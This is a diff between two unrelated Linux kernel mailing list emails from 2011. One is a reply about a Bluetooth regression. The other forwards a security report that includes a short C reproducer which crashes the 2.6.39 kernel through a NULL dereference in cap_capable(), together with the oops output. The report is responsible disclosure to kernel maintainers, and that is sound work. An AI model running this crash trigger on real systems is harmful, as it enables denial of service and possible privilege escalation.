@@ -1,77 +1,141 @@
 Return-Path: <linux-kernel-owner@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S933002Ab1EYI21 (ORCPT <rfc822;w@1wt.eu>);
-	Wed, 25 May 2011 04:28:27 -0400
-Received: from smtp.nokia.com ([147.243.128.26]:21949 "EHLO mgw-da02.nokia.com"
-	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-	id S1757382Ab1EYI2Y (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
-	Wed, 25 May 2011 04:28:24 -0400
-Date: Wed, 25 May 2011 11:27:44 +0300
-From: Ville Tervo <ville.tervo@nokia.com>
-To: ext Ed Tomlinson <edt@aei.ca>
-Cc: Milan Oravec <moravec@ukf.sk>, linux-kernel@vger.kernel.org,
-        Hui Zhu <teawater@gmail.com>, Dave Young <hidave.darkstar@gmail.com>,
-        Bluettooth Linux <linux-bluetooth@vger.kernel.org>,
-        "Gustavo F. Padovan" <padovan@profusion.mobi>
-Subject: Re: Linux 2.6.39
-Message-ID: <20110525082744.GP2480@null>
-References: <BANLkTikB37AvEgh1MAFBbYvFaxsL6W11OQ@mail.gmail.com>
- <loom.20110521T194736-595@post.gmane.org>
- <201105211631.00804.edt@aei.ca>
- <201105231808.37369.edt@aei.ca>
+	id S933091Ab1EYI2l (ORCPT <rfc822;w@1wt.eu>);
+	Wed, 25 May 2011 04:28:41 -0400
+Received: from mail-wy0-f174.google.com ([74.125.82.174]:50265 "EHLO
+	mail-wy0-f174.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+	with ESMTP id S933022Ab1EYI2h convert rfc822-to-8bit (ORCPT
+	<rfc822;linux-kernel@vger.kernel.org>);
+	Wed, 25 May 2011 04:28:37 -0400
 MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-In-Reply-To: <201105231808.37369.edt@aei.ca>
-User-Agent: Mutt/1.5.21 (2010-09-15)
-X-Nokia-AV: Clean
+In-Reply-To: <BANLkTin1zhuA3z61cBWwJws+P1-xA5bGZA@mail.gmail.com>
+References: <BANLkTikfqV57AtCckh99jAT2O38mM6MzTA@mail.gmail.com>
+	<BANLkTikey3L4doiHY=__=690TZNsXqRHUQ@mail.gmail.com>
+	<alpine.DEB.2.00.1105231133580.29047@router.home>
+	<BANLkTi=-xRRxi4CtxMLt0VgTJWSdiVQugw@mail.gmail.com>
+	<BANLkTin1zhuA3z61cBWwJws+P1-xA5bGZA@mail.gmail.com>
+Date: Wed, 25 May 2011 09:28:34 +0100
+Message-ID: <BANLkTikp4VweUE+JrkXRSJ-8kEEcPKpw8g@mail.gmail.com>
+Subject: Re: [Security] Fwd: Oops (bad memory deref) in slab_alloc() due to
+ filp_cachep holding incorrect values
+From: Eugene Teo <eugeneteo@kernel.sg>
+To: =?UTF-8?B?Um9iZXJ0IMWad2nEmWNraQ==?= <robert@swiecki.net>
+Cc: linux-kernel@vger.kernel.org, security@kernel.org, kees@ubuntu.com,
+        Tavis Ormandy <taviso@cmpxchg8b.com>,
+        David Howells <dhowells@redhat.com>
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8BIT
 Sender: linux-kernel-owner@vger.kernel.org
 List-ID: <linux-kernel.vger.kernel.org>
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-On Mon, May 23, 2011 at 06:08:36PM -0400, ext Ed Tomlinson wrote:
-> On Saturday 21 May 2011 16:31:00 Ed Tomlinson wrote:
-> > On Saturday 21 May 2011 13:56:20 Milan Oravec wrote:
-> > > Hi Linus, I'm sorry bothering you, but my usb-bluetooth dongle stop working in
-> > > 2.6.39 kernel series. 
-> > > I know it is nothing ground breaking but it is bug. 
-> > > I'm using this hardware from 2.6.11 kernel series. 
-> > > Details are included in this thread:
-> > > 
-> > > https://lkml.org/lkml/2011/4/18/481
-> > > 
-> > > I hope I'm doing nothing false writing this email. 
-> > 
-> > Same device, same problem here.
-> > 
-> > You are not alone
-> 
-> I had some time this afternood so I tried bisecting without much luck.  I ended up somewhere rc1 ish with a system
-> that would paniced during boot.  Here is the bisect log incase it helps:
-> 
-> # bad: [61c4f2c81c61f73549928dfd9f3e8f26aa36a8cf] Linux 2.6.39
-> # good: [521cb40b0c44418a4fd36dc633f575813d59a43d] Linux 2.6.38
-> git bisect start 'v2.6.39' 'v2.6.38' '--' 'drivers/bluetooth'
-> # bad: [7a6362800cb7d1d618a697a650c7aaed3eb39320] Merge git://git.kernel.org/pub/scm/linux/kernel/git/davem/net-next-2.6
-> git bisect bad 7a6362800cb7d1d618a697a650c7aaed3eb39320
-> # bad: [0a0e9ae1bd788bc19adc4d4ae08c98b233697402] Merge branch 'master' of master.kernel.org:/pub/scm/linux/kernel/git/davem/net-2.6
-> git bisect bad 0a0e9ae1bd788bc19adc4d4ae08c98b233697402
-> # skip: [03c2d0e89409b59c1ec9d9511533cedc0b7aaa69] Bluetooth: Use usb_fill_int_urb()
-> git bisect skip 03c2d0e89409b59c1ec9d9511533cedc0b7aaa69
-> # skip: [7f4b2b04c88377af30c022f36c060190182850fb] Bluetooth: Make hci a child of the corresponding tty device.
-> git bisect skip 7f4b2b04c88377af30c022f36c060190182850fb
-> # skip: [84f0e17f78471857104a20dfc57711409f68d7bf] Bluetooth: ath3k: Avoid duplication of code
-> git bisect skip 84f0e17f78471857104a20dfc57711409f68d7bf
-> 
-> Ring any bells for anyone?
-> 
-> Probably should open a regression bug for this too....
+Cc'ed David as well.
 
-I think this is regression with d5859e22cd40b73164b3e5d8d5d796f96edcc6af
-commit. Probably the code tries to enable something that is not supported.
-
-Could you pastebin hcidump while doing hciconfig hci0 up? 
-
--- 
-Ville
-
+On Tue, May 24, 2011 at 8:52 PM, Robert Święcki <robert@swiecki.net> wrote:
+> And the repro - I think this might be exploitable (user-space NULL ptr
+> deref at the first glance, in cap_capable() while in sys_setgid()).
+> Works for me with 2.6.39 and the following config:
+> http://alt.swiecki.net/linux_kernel/ise-test-2.6.39-kernel-config.txt
+>
+> It works for me with apparmor loaded, but looking at the code it
+> should work with SELinux as well (both call cap_capable()). Could be
+> some regression of http://securitytracker.com/id?1024384
+>
+> It works with 2.6.39 but not with 2.6.39-rc4. Found with Tavis
+> Ormandy's http://code.google.com/p/iknowthis/
+>
+> #include <sys/stat.h>
+> #include <sys/wait.h>
+> #include <unistd.h>
+> #include <sys/syscall.h>
+> #include <linux/keyctl.h>
+> #include <linux/sched.h>
+>
+> int TH1(void *dummy) {
+>        syscall(__NR_keyctl, KEYCTL_SESSION_TO_PARENT);
+>        syscall(__NR_exit, 0);
+> }
+>
+> int main(int argc, char **argv)
+> {
+>        char stack[1024 * 32];
+>        pid_t pid = clone(TH1, stack + sizeof(stack), CLONE_VM, NULL);
+>        if (pid == -1) {
+>                perror("clone");
+>                return -1;
+>        }
+>        int status;
+>        while(waitpid(pid, &status, __WALL) != pid);
+>        setgid(4286409707);
+>        return 0;
+> }
+>
+> Oops (stacktraces from the previous emails are also valid). Basically
+> 'struct user_namespace *targ_ns' in cap_capable() is NULL.
+>
+> [  288.431402] CPU 0
+> [  288.431402] Pid: 875, comm: apparmor Not tainted 2.6.39 #1 Dell
+> Inc.                 Precision WorkStation 390    /0GH911
+> [  288.431402] RIP: 0010:[<ffffffff8134cbdf>]  [<ffffffff8134cbdf>]
+> cap_capable+0x18/0x67
+> [  288.431402] RSP: 0018:ffff880120d43ec8  EFLAGS: 00010203
+> [  288.431402] RAX: ffff8801220ee0c0 RBX: 0000000000000001 RCX: 0000000000000006
+> [  288.431402] RDX: 0000000000000000 RSI: ffff880120ebb600 RDI: 0000000000000006
+> [  288.431402] RBP: ffff880120d43ec8 R08: 0000000000000001 R09: 000000000000005a
+> [  288.431402] R10: ffffffff813d42ea R11: 0000000000000246 R12: ffff880120ebb600
+> [  288.431402] R13: 0000000000000006 R14: ffff8801205aaee0 R15: 0000000000000000
+> [  288.431402] FS:  00007f919efc2720(0000) GS:ffff88012bc00000(0000)
+> knlGS:0000000000000000
+> [  288.431402] CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b
+> [  288.431402] CR2: 0000000000000408 CR3: 00000001205de000 CR4: 00000000000006f0
+> [  288.431402] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
+> [  288.431402] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400
+> [  288.431402] Process apparmor (pid: 875, threadinfo
+> ffff880120d42000, task ffff8801205aaee0)
+> [  288.431402] Stack:
+> [  288.431402]  ffff880120d43f08 ffffffff81378bfb ffff880120d43ee8
+> ffff8801205aaee0
+> [  288.431402]  00000000ff7d6beb ffff880120ebb600 0000000000000000
+> 0000000000000000
+> [  288.431402]  ffff880120d43f18 ffffffff8134d932 ffff880120d43f38
+> ffffffff8109d99d
+> [  288.431402] Call Trace:
+> [  288.431402]  [<ffffffff81378bfb>] apparmor_capable+0x27/0x61
+> [  288.431402]  [<ffffffff8134d932>] security_capable+0x2a/0x2c
+> [  288.431402]  [<ffffffff8109d99d>] ns_capable+0x3a/0x4f
+> [  288.431402]  [<ffffffff8109da2b>] nsown_capable+0x24/0x29
+> [  288.431402]  [<ffffffff810a6695>] sys_setgid+0x43/0x8d
+> [  288.431402]  [<ffffffff81ed4902>] system_call_fastpath+0x16/0x1b
+> [  288.431402] Code: c1 fe 05 d3 e0 48 63 f6 23 44 b2 38 c9 83 f8 01
+> 19 c0 c3 55 48 89 e5 0f 1f 44 00 00 89 cf 48 81 fa f0 16 a2 82 74 0d
+> 48 8b 46 70
+> [  288.431402]  39 82 08 04 00 00 74 3d 48 8b 46 70 48 3b 50 60 75 1d 89 f9
+> [  288.431402] RIP  [<ffffffff8134cbdf>] cap_capable+0x18/0x67
+> [  288.431402]  RSP <ffff880120d43ec8>
+> [  288.431402] CR2: 0000000000000408
+>
+> (gdb) bt
+> #0  0xffffffff8134cbdf in cap_capable (tsk=<value optimized out>,
+> cred=0x0, targ_ns=0x0, cap=6, audit=1) at security/commoncap.c:88
+> #1  0xffffffff81378bfb in apparmor_capable (task=0xffff880120e3aee0,
+> cred=0xffff88011f540500, ns=<value optimized out>, cap=6, audit=1) at
+> security/apparmor/lsm.c:144
+> #2  0xffffffff8134d932 in security_capable (ns=<value optimized out>,
+> cred=<value optimized out>, cap=<value optimized out>) at
+> security/security.c:160
+> #3  0xffffffff8109d99d in ns_capable (ns=<value optimized out>,
+> cap=<value optimized out>) at kernel/capability.c:381
+> #4  0xffffffff8109da2b in nsown_capable (cap=<value optimized out>) at
+> kernel/capability.c:412
+> #5  0xffffffff810a6695 in sys_setgid (gid=1540) at kernel/sys.c:570
+> #6  0xffffffff810c1e11 in sys_setgid16 (gid=<value optimized out>) at
+> kernel/uid16.c:53
+>
+> --
+> Robert Święcki
+>
+> _______________________________________________
+> Security mailing list
+> Security@linux.kernel.org
+> http://linux.kernel.org/mailman/listinfo/security
+>
